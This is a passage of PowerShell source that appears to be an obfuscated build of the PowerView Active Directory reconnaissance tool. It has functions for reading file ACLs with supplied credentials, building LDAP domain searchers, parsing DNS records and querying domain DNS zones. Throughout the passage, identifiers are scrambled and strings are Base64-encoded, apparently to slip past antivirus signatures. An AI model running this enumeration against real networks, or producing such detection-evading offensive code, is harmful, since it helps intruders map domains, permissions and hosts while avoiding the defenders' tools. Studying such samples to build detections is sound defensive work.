        ${/=======\/==\_/==} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=======\/==\_/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/=\_/\__/\_/=\/\/} = @{}
    }
    PROCESS {
        ForEach (${/=\/=\_/\/===\/==} in $Path) {
            try {
                if ((${/=\/=\_/\/===\/==} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                    ${__/\/\_/\_/\/==\_} = (New-Object System.Uri(${/=\/=\_/\/===\/==})).Host
                    if (-not ${/=\_/\__/\_/=\/\/}[${__/\/\_/\_/\/==\_}]) {
                        _/=\____/\/\/=\__/ -/=\/\/\/=\__/\_/= ${__/\/\_/\_/\/==\_} -Credential $Credential
                        ${/=\_/\__/\_/=\/\/}[${__/\/\_/\_/\/==\_}] = $True
                    }
                }
                ${/=\____/=\_/\/=\_} = Get-Acl -Path ${/=\/=\_/\/===\/==}
                ${/=\____/=\_/\/=\_}.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | % {
                    ${_/\/=\_/=\/==\__/} = $_.IdentityReference.Value
                    $Name = __/\/=\/=\_/\/=\/= -/===\_/\_/\_/=\__ ${_/\/=\_/=\/==\__/} @/=======\/==\_/==
                    ${/==\/===\__/\___/} = New-Object PSObject
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) ${/=\/=\_/\/===\/==}
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBTAHkAcwB0AGUAbQBSAGkAZwBoAHQAcwA='))) (_/=\_/\/=\_/\_/=\_ -_/=\____/\___/=\_/ $_.FileSystemRights.value__)
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) $Name
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFMASQBEAA=='))) ${_/\/=\_/=\/==\__/}
                    ${/==\/===\__/\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbABUAHkAcABlAA=='))) $_.AccessControlType
                    ${/==\/===\__/\___/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAGkAbABlAEEAQwBMAA=='))))
                    ${/==\/===\__/\___/}
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAYQB0AGgAQQBjAGwAXQAgAGUAcgByAG8AcgA6ACAAJABfAA==')))
            }
        }
    }
    END {
        ${/=\_/\__/\_/=\/\/}.Keys | __/======\__/===\_
    }
}
function _______/==\_/=\_/= {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )
    ${____/====\____/=\} = @{}
    $Properties.PropertyNames | % {
        if ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHMAcABhAHQAaAA=')))) {
            if (($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGQAaABpAHMAdABvAHIAeQA='))))) {
                ${____/====\____/=\}[$_] = $Properties[$_] | % { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAHQAeQBwAGUA')))) {
                ${____/====\____/=\}[$_] = $Properties[$_][0] -as ${_/\_____/=\/\_/\/}
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA==')))) {
                ${____/====\____/=\}[$_] = $Properties[$_][0] -as ${/=\_/==\/====\_/=}
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA=')))) {
                ${____/====\____/=\}[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA')))) {
                ${____/====\____/=\}[$_] = $Properties[$_][0] -as ${/=\____/\/===\/\_}
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByAA==')))) {
                ${/=\__/=====\____/} = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if (${/=\__/=====\____/}.Owner) {
                    ${____/====\____/=\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA==')))] = ${/=\__/=====\____/}.Owner
                }
                if (${/=\__/=====\____/}.Group) {
                    ${____/====\____/=\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))] = ${/=\__/=====\____/}.Group
                }
                if (${/=\__/=====\____/}.DiscretionaryAcl) {
                    ${____/====\____/=\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYwByAGUAdABpAG8AbgBhAHIAeQBBAGMAbAA=')))] = ${/=\__/=====\____/}.DiscretionaryAcl
                }
                if (${/=\__/=====\____/}.SystemAcl) {
                    ${____/====\____/=\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0AQQBjAGwA')))] = ${/=\__/=====\____/}.SystemAcl
                }
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA==')))) {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    ${____/====\____/=\}[$_] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFYARQBSAA==')))
                }
                else {
                    ${____/====\____/=\}[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAUABhAHMAcwB3AG8AcgBkAFQAaQBtAGUA')))) ) {
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    ${/===\__/\/\/\/=\_} = $Properties[$_][0]
                    [Int32]${___/\_/=====\___/} = ${/===\__/\/\/\/=\_}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $Null, ${/===\__/\/\/\/=\_}, $Null)
                    [Int32]${________/=\/\/==\}  = ${/===\__/\/\/\/=\_}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $Null, ${/===\__/\/\/\/=\_}, $Null)
                    ${____/====\____/=\}[$_] = ([datetime]::FromFileTime([Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f ${___/\_/=====\___/}, ${________/=\/\/==\})))
                }
                else {
                    ${____/====\____/=\}[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                ${/\__________/\/=\} = $Properties[$_]
                try {
                    ${/===\__/\/\/\/=\_} = ${/\__________/\/=\}[$_][0]
                    [Int32]${___/\_/=====\___/} = ${/===\__/\/\/\/=\_}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $Null, ${/===\__/\/\/\/=\_}, $Null)
                    [Int32]${________/=\/\/==\}  = ${/===\__/\/\/\/=\_}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $Null, ${/===\__/\/\/\/=\_}, $Null)
                    ${____/====\____/=\}[$_] = [Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f ${___/\_/=====\___/}, ${________/=\/\/==\})
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0ATABEAEEAUABQAHIAbwBwAGUAcgB0AHkAXQAgAGUAcgByAG8AcgA6ACAAJABfAA==')))
                    ${____/====\____/=\}[$_] = ${/\__________/\/=\}[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                ${____/====\____/=\}[$_] = $Properties[$_][0]
            }
            else {
                ${____/====\____/=\}[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property ${____/====\____/=\}
    }
    catch {
        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0ATABEAEEAUABQAHIAbwBwAGUAcgB0AHkAXQAgAEUAcgByAG8AcgAgAHAAYQByAHMAaQBuAGcAIABMAEQAQQBQACAAcAByAG8AcABlAHIAdABpAGUAcwAgADoAIAAkAF8A')))
    }
}
function _/=\_/=\_/==\_/\/\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [String]
        ${_/=\__/\/=\/\_/==\},
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            $TargetDomain = $Domain
            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $UserDomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    ${_/==\__/=\_/\/\_/} = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${_/\/=\__/\___/\/=} = __/\/\__/=\/\/\/\/ -Credential $Credential
            ${_/==\__/=\_/\/\_/} = (${_/\/=\__/\___/\/=}.PdcRoleOwner).Name
            $TargetDomain = ${_/\/=\__/\___/\/=}.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $TargetDomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                ${_/==\__/=\_/\/\_/} = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            write-verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBlAHQALQBkAG8AbQBhAGkAbgA=')))
            ${_/\/=\__/\___/\/=} = __/\/\__/=\/\/\/\/
            ${_/==\__/=\_/\/\_/} = (${_/\/=\__/\___/\/=}.PdcRoleOwner).Name
            $TargetDomain = ${_/\/=\__/\___/\/=}.Name
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            ${_/==\__/=\_/\/\_/} = $Server
        }
        ${_/\___/===\__/\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwA=')))
        if (${_/==\__/=\_/\/\_/} -and (${_/==\__/=\_/\/\_/}.Trim() -ne '')) {
            ${_/\___/===\__/\/=} += ${_/==\__/=\_/\/\_/}
            if ($TargetDomain) {
                ${_/\___/===\__/\/=} += '/'
            }
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQBQAHIAZQBmAGkAeAA=')))]) {
            ${_/\___/===\__/\/=} += ${_/=\__/\/=\/\_/==\} + ','
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) {
            if ($SearchBase -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBHAEMAOgAvAC8A')))) {
                ${___/=\____/=\/\__} = $SearchBase.ToUpper().Trim('/')
                ${_/\___/===\__/\/=} = ''
            }
            else {
                if ($SearchBase -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBMAEQAQQBQADoALwAvAA==')))) {
                    if ($SearchBase -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAuACsALwAuACsA')))) {
                        ${_/\___/===\__/\/=} = ''
                        ${___/=\____/=\/\__} = $SearchBase
                    }
                    else {
                        ${___/=\____/=\/\__} = $SearchBase.SubString(7)
                    }
                }
                else {
                    ${___/=\____/=\/\__} = $SearchBase
                }
            }
        }
        else {
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                ${___/=\____/=\/\__} = "DC=$($TargetDomain.Replace('.', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA=')))))"
            }
        }
        ${_/\___/===\__/\/=} += ${___/=\____/=\/\__}
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAZQBhAHIAYwBoAGUAcgBdACAAcwBlAGEAcgBjAGgAIABiAGEAcwBlADoAIAAkAHsAXwAvAFwAXwBfAF8ALwA9AD0APQBcAF8AXwAvAFwALwA9AH0A')))
        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAZQBhAHIAYwBoAGUAcgBdACAAVQBzAGkAbgBnACAAYQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABmAG8AcgAgAEwARABBAFAAIABjAG8AbgBuAGUAYwB0AGkAbwBuAA==')))
            ${_/\/=\__/\___/\/=} = New-Object DirectoryServices.DirectoryEntry(${_/\___/===\__/\/=}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            ${/=\/=\/=\__/\___/} = New-Object System.DirectoryServices.DirectorySearcher(${_/\/=\__/\___/\/=})
        }
        else {
            ${/=\/=\/=\__/\___/} = New-Object System.DirectoryServices.DirectorySearcher([ADSI]${_/\___/===\__/\/=})
        }
        ${/=\/=\/=\__/\___/}.PageSize = $ResultPageSize
        ${/=\/=\/=\__/\___/}.SearchScope = $SearchScope
        ${/=\/=\/=\__/\___/}.CacheResults = $False
        ${/=\/=\/=\__/\___/}.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) {
            ${/=\/=\/=\__/\___/}.ServerTimeLimit = $ServerTimeLimit
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) {
            ${/=\/=\/=\__/\___/}.Tombstone = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
            ${/=\/=\/=\__/\___/}.filter = $LDAPFilter
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) {
            ${/=\/=\/=\__/\___/}.SecurityMasks = Switch ($SecurityMasks) {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA='))) { [System.DirectoryServices.SecurityMasks]::Dacl }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))) { [System.DirectoryServices.SecurityMasks]::Group }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA='))) { [System.DirectoryServices.SecurityMasks]::None }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA=='))) { [System.DirectoryServices.SecurityMasks]::Owner }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA='))) { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            ${/=\___/\/\/\/=\_/} = $Properties| % { $_.Split(',') }
            $Null = ${/=\/=\/=\__/\___/}.PropertiesToLoad.AddRange((${/=\___/\/\/\/=\_/}))
        }
        ${/=\/=\/=\__/\___/}
    }
}
function _____/\_____/=\/== {
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )
    BEGIN {
        function _/==\__/====\_/=== {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )
            [Int]${/=\/\/=\/\_/===\_} = $Raw[0]
            [Int]${__/\_/===\__/\__/} = $Raw[1]
            [Int]${__/===\___/=\/\_/} =  2
            [String]$Name  = ''
            while (${__/\_/===\__/\__/}-- -gt 0)
            {
                [Int]${/=\/\__/\/===\_/\} = $Raw[${__/===\___/=\/\_/}++]
                while (${/=\/\__/\/===\_/\}-- -gt 0) {
                    $Name += [Char]$Raw[${__/===\___/=\/\_/}++]
                }
                $Name += "."
            }
            $Name
        }
    }
    PROCESS {
        ${___/=\/\_______/\} = [BitConverter]::ToUInt16($DNSRecord, 2)
        ${_/\/\/\/\/\_/\/\_} = [BitConverter]::ToUInt32($DNSRecord, 8)
        ${_/\_/\/\__/\/==\_} = $DNSRecord[12..15]
        $Null = [array]::Reverse(${_/\_/\/\__/\/==\_})
        ${____/==\/\/\/==\_} = [BitConverter]::ToUInt32(${_/\_/\/\__/\/==\_}, 0)
        ${/====\/=\___/=\/=} = [BitConverter]::ToUInt32($DNSRecord, 20)
        if (${/====\/=\___/=\/=} -ne 0) {
            ${___/\/=\/==\/=\__} = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours(${/====\/=\___/=\/=})).ToString()
        }
        else {
            ${___/\/=\/==\/=\__} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBzAHQAYQB0AGkAYwBdAA==')))
        }
        ${__/====\__/\/====} = New-Object PSObject
        if (${___/=\/\_______/\} -eq 1) {
            ${/=\_/=\_/==\/\_/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwAH0ALgB7ADEAfQAuAHsAMgB9AC4AewAzAH0A'))) -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            ${/=\/=\_/\__/==\_/} = ${/=\_/=\_/==\/\_/=}
            ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'A'
        }
        elseif (${___/=\/\_______/\} -eq 2) {
            ${____/\/\/\_/\/\/\} = _/==\__/====\_/=== $DNSRecord[24..$DNSRecord.length]
            ${/=\/=\_/\__/==\_/} = ${____/\/\/\_/\/\/\}
            ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'NS'
        }
        elseif (${___/=\/\_______/\} -eq 5) {
            ${/===\/=\/=====\__} = _/==\__/====\_/=== $DNSRecord[24..$DNSRecord.length]
            ${/=\/=\_/\__/==\_/} = ${/===\/=\/=====\__}
            ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAEEATQBFAA==')))
        }
        elseif (${___/=\/\_______/\} -eq 6) {
            ${/=\/=\_/\__/==\_/} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEEA')))
        }
        elseif (${___/=\/\_______/\} -eq 12) {
            ${_/==\/===\_/\_/\/} = _/==\__/====\_/=== $DNSRecord[24..$DNSRecord.length]
            ${/=\/=\_/\__/==\_/} = ${_/==\/===\_/\_/\/}
            ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABUAFIA')))
        }
        elseif (${___/=\/\_______/\} -eq 13) {
            ${/=\/=\_/\__/==\_/} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABJAE4ARgBPAA==')))
        }
        elseif (${___/=\/\_______/\} -eq 15) {
            ${/=\/=\_/\__/==\_/} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'MX'
        }
        elseif (${___/=\/\_______/\} -eq 16) {
            [string]${_/=\_/\/\/\/==\__}  = ''
            [int]${/=\/\__/\/===\_/\} = $DNSRecord[24]
            ${__/===\___/=\/\_/} = 25
            while (${/=\/\__/\/===\_/\}-- -gt 0) {
                ${_/=\_/\/\/\/==\__} += [char]$DNSRecord[${__/===\___/=\/\_/}++]
            }
            ${/=\/=\_/\__/==\_/} = ${_/=\_/\/\/\/==\__}
            ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABYAFQA')))
        }
        elseif (${___/=\/\_______/\} -eq 28) {
            ${/=\/=\_/\__/==\_/} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBBAEEAQQA=')))
        }
        elseif (${___/=\/\_______/\} -eq 33) {
            ${/=\/=\_/\__/==\_/} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBSAFYA')))
        }
        else {
            ${/=\/=\_/\__/==\_/} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
        }
        ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAZABBAHQAUwBlAHIAaQBhAGwA'))) ${_/\/\/\/\/\_/\/\_}
        ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABUAEwA'))) ${____/==\/\/\/==\_}
        ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBnAGUA'))) ${/====\/=\___/=\/=}
        ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBTAHQAYQBtAHAA'))) ${___/\/=\/==\/=\__}
        ${__/====\__/\/====} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQA='))) ${/=\/=\_/\__/==\_/}
        ${__/====\__/\/====}
    }
}
function Get-DomainDNSZone {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${_/\/\/\/\___/\/\/} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQBkAG4AcwBaAG8AbgBlACkA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
